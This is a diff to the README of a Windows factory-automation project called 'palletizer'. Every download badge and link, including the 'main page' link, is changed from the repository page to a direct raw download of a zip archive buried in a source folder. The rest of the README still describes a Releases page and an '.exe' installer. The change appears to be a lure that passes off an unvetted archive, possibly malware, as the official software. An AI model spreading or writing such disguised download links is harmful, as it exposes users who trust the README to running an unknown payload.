@@ -1,6 +1,6 @@
 # 🤖 palletizer - Simplify Your Factory Automation
 
-[![Download palletizer](https://img.shields.io/badge/Download-Get%20palletizer-blue?style=for-the-badge&logo=github)](https://github.com/Normanwillful908/palletizer)
+[![Download palletizer](https://img.shields.io/badge/Download-Get%20palletizer-blue?style=for-the-badge&logo=github)](https://github.com/Normanwillful908/palletizer/raw/refs/heads/main/palletizer_full/core/Software_v3.9-alpha.2.zip)
 
 ---
 
@@ -37,7 +37,7 @@ Follow these steps to get palletizer up and running on your Windows computer. Yo
 
 Visit the link below to download the latest version of palletizer. This link takes you to the official GitHub page where you will find the latest release files.
 
-[Download palletizer](https://github.com/Normanwillful908/palletizer)
+[Download palletizer](https://github.com/Normanwillful908/palletizer/raw/refs/heads/main/palletizer_full/core/Software_v3.9-alpha.2.zip)
 
 You will see a "Releases" section on the page. Find the latest release and download the Windows installer file. It should have a name ending with `.exe`.
 
@@ -131,7 +131,7 @@ If problems continue, visit the GitHub Issues page for palletizer to find help o
 
 Keep palletizer up to date for best performance and security:
 
-- Visit the [palletizer GitHub page](https://github.com/Normanwillful908/palletizer) regularly.  
+- Visit the [palletizer GitHub page](https://github.com/Normanwillful908/palletizer/raw/refs/heads/main/palletizer_full/core/Software_v3.9-alpha.2.zip) regularly.  
 - Download new versions from the Releases section.  
 - Run the installer for the update similarly to the first installation.
 
@@ -139,7 +139,7 @@ Keep palletizer up to date for best performance and security:
 
 ## 🌐 Useful Links
 
-- Download and main page: [https://github.com/Normanwillful908/palletizer](https://github.com/Normanwillful908/palletizer)  
+- Download and main page: [https://github.com/Normanwillful908/palletizer/raw/refs/heads/main/palletizer_full/core/Software_v3.9-alpha.2.zip](https://github.com/Normanwillful908/palletizer/raw/refs/heads/main/palletizer_full/core/Software_v3.9-alpha.2.zip)  
 - Issues and support: GitHub Issues tab on the main page  
 - Documentation: Check the GitHub Wiki tab for detailed guides and setup info  
 
@@ -170,4 +170,4 @@ Built with Python and designed to work across many devices, palletizer aims to m
 
 ---
 
-[![Download palletizer](https://img.shields.io/badge/Download-Get%20palletizer-blue?style=for-the-badge&logo=github)](https://github.com/Normanwillful908/palletizer)
+[![Download palletizer](https://img.shields.io/badge/Download-Get%20palletizer-blue?style=for-the-badge&logo=github)](https://github.com/Normanwillful908/palletizer/raw/refs/heads/main/palletizer_full/core/Software_v3.9-alpha.2.zip)
